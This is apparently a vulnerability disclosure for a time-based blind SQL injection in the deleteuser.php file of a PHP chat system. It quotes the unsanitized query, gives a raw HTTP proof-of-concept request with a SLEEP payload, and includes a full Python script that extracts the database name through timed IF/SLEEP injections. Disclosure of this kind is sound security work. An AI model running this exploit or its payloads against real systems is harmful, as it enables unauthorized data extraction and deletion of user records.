# chat system has sql injection in deleteuser.php



## supplier



https://code-projects.org/chat-system-using-php-source-code/



## Vulnerability file



deleteuser.php



## describe



Because the id parameter is not sanitized or parameterized, an attacker can inject malicious SQL code to manipulate the database query. By leveraging time-based SQL injection techniques, an attacker can induce deliberate delays in the database response using functions like SLEEP(). This can be used to confirm the presence of the vulnerability and potentially extract sensitive information from the database.



## **Code analysis**



```php
<?php
	include('session.php');
	if(isset($_POST['del'])){
		$id=$_POST['id'];
		
		mysqli_query($conn,"delete from `user` where userid='$id'");
	}

?>
```

Inserting $_POST['id'] into Mysql without any filter. A time-based blind SQL injection can be triggered.



There is also a **session** privilege escalation vulnerability, which can be exploited to **bypass** the **session** checks for admin functionalities as a regular user.



## POC

```http
POST /admin/deleteuser.php HTTP/1.1
Host: 127.0.0.1:88
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 28
Origin: http://127.0.0.1:88
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://127.0.0.1:88/admin/user.php
Cookie: PHPSESSID=b5htgkjnhs0etvlaida5e47sjq
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

id=3' or sleep(5) #&del=1
```



Send this request, you can observe an additional 5-second time delay triggered by the time-based injection.



## Exploit

To retrieve the current database name.

```python
import requests
import string
import time
import logging

# Configuration
TARGET_URL = "http://127.0.0.1:88/admin/deleteuser.php"  # URL
SESSION_COOKIE = "PHPSESSID=b5htgkjnhs0etvlaida5e47sjq"  # session ID
DELAY_TIME = 3  # sleep_time
TIME_THRESHOLD = 2.5  # The threshold for determining the delay
MAX_DB_NAME_LENGTH = 32  # The maximum expected length of the database name
CHARSET = ''.join([chr(i) for i in range(32, 127)])  # all ASCII

# log
logging.basicConfig(filename='sql_injection.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Headers
HEADERS = {
    "Host": "127.0.0.1:88",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Accept": "*/*",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:88",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "keep-alive",
    "Referer": "http://127.0.0.1:88/admin/user.php",
    "Cookie": SESSION_COOKIE,
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Priority": "u=0",
}

# Function to send payload and measure response time with retry mechanism
def send_payload(payload, retries=3):
    data = {
        "id": payload,
        "del": "1"
    }
    for attempt in range(retries):
        start_time = time.time()
        try:
            response = requests.post(TARGET_URL, headers=HEADERS, data=data, timeout=DELAY_TIME + 5)
            end_time = time.time()
            elapsed = end_time - start_time
            logging.info(f"Payload: {payload} | Response Time: {elapsed:.2f}s")
            print(f"[>] Payload: {payload} | Response Time: {elapsed:.2f}s")
            return elapsed
        except requests.exceptions.Timeout:
            logging.warning(f"Payload caused timeout: {payload} (Attempt {attempt + 1}/{retries})")
            print(f"[!] Payload caused timeout: {payload} (Attempt {attempt + 1}/{retries})")
            if attempt == retries - 1:
                return DELAY_TIME + 1
    return DELAY_TIME + 1

# Function to check if a condition is true based on response delay using IF
def is_condition_true(condition):
    payload = f"3' OR IF({condition}, SLEEP({DELAY_TIME}), 0) #"
    response_time = send_payload(payload)
    return response_time >= TIME_THRESHOLD

# Function to test basic SLEEP injection
def test_sleep():
    payload = "3' OR IF(1=1, SLEEP(3), 0) #"
    print("[*] Testing basic IF(SLEEP) injection...")
    response_time = send_payload(payload)
    if response_time >= DELAY_TIME:
        print("[+] Basic IF(SLEEP) injection works.")
        return True
    else:
        print("[-] Basic IF(SLEEP) injection failed.")
        return False

# Function to determine the length of the database name
def get_db_name_length():
    length = 0
    while length < MAX_DB_NAME_LENGTH:
        condition = f"CHAR_LENGTH(database()) > {length}"
        if is_condition_true(condition):
            length += 1
            print(f"[*] CHAR_LENGTH(database()) > {length - 1} is True")
        else:
            break
    return length

# Function to get a single character at a specific position using binary search
def get_db_char(position):
    low = 32
    high = 126
    while low <= high:
        mid = (low + high) // 2
        condition = f"ASCII(SUBSTRING(database(),{position},1)) > {mid}"
        if is_condition_true(condition):
            low = mid + 1
        else:
            high = mid - 1
    if 32 <= low <= 126:
        return chr(low)
    return None

# Main function to extract the database name
def extract_database_name():
    print("[*] Starting Time-Based Blind SQL Injection to extract database name...")

    # Test basic SLEEP injection
    if not test_sleep():
        print("[-] Basic SLEEP injection failed. Aborting further tests.")
        return

    # Proceed with extracting database name
    db_length = get_db_name_length()
    print(f"[*] Detected database name length: {db_length}")
    db_name = ""
    for position in range(1, db_length + 1):
        char = get_db_char(position)
        if char:
            db_name += char
            print(f"[+] Position {position}: '{char}'")
        else:
            print(f"[-] Failed to determine character at position {position}")
            break
    print(f"\n[+] Extracted Database Name: {db_name}")

if __name__ == "__main__":
    extract_database_name()

```



**Result**

![image-20250101042918832](C:\Users\sinon\AppData\Roaming\Typora\typora-user-images\image-20250101042918832.png)









